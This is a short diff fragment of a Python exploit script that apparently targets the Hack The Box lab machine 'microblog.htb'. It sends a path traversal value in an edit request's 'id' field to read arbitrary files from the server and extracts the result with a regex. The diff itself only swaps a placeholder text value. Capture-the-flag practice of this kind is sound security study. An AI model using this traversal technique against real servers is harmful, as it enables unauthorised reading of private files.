@@ -29,7 +29,7 @@ resp = sess.post("http://app.microblog.htb/dashboard/",
 
 # file read
 resp = sess.post(f"http://microblog.htb/edit/",
-                 data={"id": f"../../../../../../{file}", "txt": "0xdf"},
+                 data={"id": f"../../../../../../{file}", "txt": "s3c"},
                  headers={"Host": f"{id}.microblog.htb"},
                  allow_redirects=False)
 data = re.search(r'const html = "<div class = \\".+?\\">(.*?)<\\/',
